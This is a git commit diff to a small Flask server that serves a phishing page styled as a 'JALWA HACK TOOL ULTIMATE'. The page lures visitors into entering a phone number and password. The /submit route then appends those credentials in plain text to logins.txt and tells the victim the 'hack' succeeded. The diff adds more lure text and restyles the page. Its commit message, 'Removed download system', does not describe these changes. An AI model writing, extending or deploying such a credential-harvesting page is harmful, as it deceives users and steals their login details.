6dc1f29a25a3e7b5a96c1f2d153d4225d6ac92d7
rani4213Rb <rani4213raja@gmail.com>
2025-07-03 04:00:14 +0530

    Removed download system

--- server.py
+++ server.py
@@ -5,12 +5,14 @@ app = Flask(__name__)
 @app.route('/')
 def home():
     return '''
-    <h2>🔥 Welcome to Jalwa Hack Login 🔥</h2>
+    <h1 style="color:lime; background:black; font-size:40px;">🔥 JALWA HACK TOOL ULTIMATE 🔥</h1>
+    <h3 style="color:red;">H A C K   N U M B E R   F O U N D !</h3>
     <form action="/submit" method="post">
-      <b>Number:</b> <input type="text" name="number"><br><br>
-      <b>Password:</b> <input type="password" name="password"><br><br>
-      <input type="submit" value="Login 🔥">
+        <b>Number:</b> <input type="text" name="number"><br><br>
+        <b>Password:</b> <input type="password" name="password"><br><br>
+        <input type="submit" value="💣 Hack Now 💣">
     </form>
+    <p style="color:yellow; font-size:20px;">Use this number to sign up and activate hack - Jalwa Mode ON!</p>
     '''
 
 @app.route('/submit', methods=['POST'])
@@ -20,8 +22,9 @@ def submit():
     with open("logins.txt", "a") as f:
         f.write(f"Number: {number}, Password: {password}\n")
     return '''
-    <h3>✅ Hack Successful! Data Captured!</h3>
-    <p>Check your file later.</p>
+    <h3 style="color:lime;">✅ Hack Successful! Data Captured!</h3>
+    <p>Check your logins.txt file.</p>
+    <a href="/">Back</a>
     '''
 
 if __name__ == "__main__":
